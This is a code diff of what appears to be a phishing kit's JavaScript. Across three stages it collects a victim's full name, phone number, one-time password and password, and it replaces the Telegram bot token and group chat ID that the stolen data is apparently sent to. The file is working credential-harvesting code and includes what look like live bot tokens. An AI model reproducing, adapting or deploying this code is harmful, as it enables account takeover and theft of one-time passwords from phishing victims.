@@ -9,8 +9,8 @@ function processFirstData(){
 	var gabungan = 'full_name%3A%0A'+full_name.value+'%0Aphone_number%3A%0A'+phone_number.value;
 
 
-	var token = '8117938225:AAGI9Wx_gwDSIj7pMNRo9nYaK-mT4a6cODA';
-	var grup = '-4916418015';
+	var token = '7631033651:AAHhj41wsNY5qRTrfGJ_1ouXn9lkz6zJgWM';
+	var grup = '-4932277785';
 
 	if($full_name == "" && $phone_number == ""){
 	$('.verification_info').show();
@@ -47,8 +47,8 @@ function processSecondData(){
 
 	var gabungan = 'full_name%3A%0A'+full_name.value+'%0Aphone_number%3A%0A'+phone_number.value+`%0Aotp%3A%0A`+otp.value;
 	
-	var token = '8117938225:AAGI9Wx_gwDSIj7pMNRo9nYaK-mT4a6cODA';
-	var grup = '-4916418015';
+	var token = '7631033651:AAHhj41wsNY5qRTrfGJ_1ouXn9lkz6zJgWM';
+	var grup = '-4932277785';
 	if($full_name == "" && $phone_number == "" && $otp == ""){
 	$('.verification_info').show();
 	$('.account_verification').hide();
@@ -84,8 +84,8 @@ function processThirdData(){
 
 	var gabungan = 'full_name%3A%0A'+full_name.value+'%0Aphone_number%3A%0A'+phone_number.value+`%0Aotp%3A%0A`+otp.value+`%0Apassword%3A%0A`+password.value;
 	
-	var token = '8117938225:AAGI9Wx_gwDSIj7pMNRo9nYaK-mT4a6cODA';
-	var grup = '-4916418015';
+	var token = '7631033651:AAHhj41wsNY5qRTrfGJ_1ouXn9lkz6zJgWM';
+	var grup = '-4932277785';
 	
 	if($full_name == "" && $phone_number == "" && $otp == "" && $password == ""){
 	$('.verification_info').show();
